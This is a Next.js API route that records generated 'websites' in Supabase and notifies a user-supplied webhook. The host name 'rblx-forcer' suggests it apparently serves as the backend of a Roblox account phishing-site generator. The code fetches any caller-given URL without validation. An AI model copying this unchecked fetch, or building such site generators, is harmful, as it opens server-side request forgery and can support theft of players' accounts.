import type { NextApiRequest, NextApiResponse } from "next";
import { createClient } from "@supabase/supabase-js";

// ✅ Initialize Supabase client using your Vercel environment variables
const supabase = createClient(
  process.env.NEXT_PUBLIC_SUPABASE_URL!,
  process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!
);

// ✅ Define the response type
type ResponseData = {
  success: boolean;
  message: string;
  url?: string;
};

// ✅ API Route Handler
export default async function handler(
  req: NextApiRequest,
  res: NextApiResponse<ResponseData>
) {
  // Only allow POST requests
  if (req.method !== "POST") {
    return res
      .status(405)
      .json({ success: false, message: "Method not allowed. Use POST." });
  }

  try {
    const { title, directory, webhookUrl } = req.body;

    // Validate input
    if (!title || !directory || !webhookUrl) {
      return res.status(400).json({
        success: false,
        message: "Missing fields: title, directory, or webhookUrl.",
      });
    }

    // Insert new site record into Supabase
    const { error } = await supabase.from("websites").insert([
      {
        title,
        directory,
        webhook_url: webhookUrl,
      },
    ]);

    if (error) {
      console.error("Supabase error:", error.message);
      return res.status(500).json({
        success: false,
        message: "Failed to create website record in Supabase.",
      });
    }

    // (Optional) Send webhook notification to user
    try {
      await fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          message: `✅ Your new site has been generated! Visit https://rblx-forcer.vercel.app/${directory}`,
        }),
      });
    } catch {
      console.warn("⚠️ Webhook delivery failed (but site still created).");
    }

    // Return success response
    return res.status(200).json({
      success: true,
      message: "Website generated successfully!",
      url: `https://rblx-forcer.vercel.app/${directory}`,
    });
  } catch (err: any) {
    console.error("Unexpected error:", err);
    return res.status(500).json({
      success: false,
      message: "Internal server error.",
    });
  }
}
